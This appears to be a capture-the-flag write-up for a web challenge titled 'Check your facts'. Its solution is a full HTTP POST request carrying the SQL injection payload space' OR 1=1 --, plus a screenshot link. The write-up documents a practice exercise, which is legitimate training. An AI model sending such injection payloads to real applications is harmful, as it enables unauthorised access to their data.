# Check your facts
Always check your facts. How are they stored, for example?
# Solution
```http
POST / HTTP/1.1
Host: pecan-check-your-facts.chals.io
Content-Length: 24
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://pecan-check-your-facts.chals.io
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://pecan-check-your-facts.chals.io/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=0, i
Connection: close

query=space'+OR+1%3d1+--
```
Make sure you give the query `space' OR 1=1 --`
![image](https://github.com/LAVANYA-PIDIKITI/PECAN-_Main-Prelims/assets/98797256/634f69a2-f404-45bd-a1be-551e9127235e)
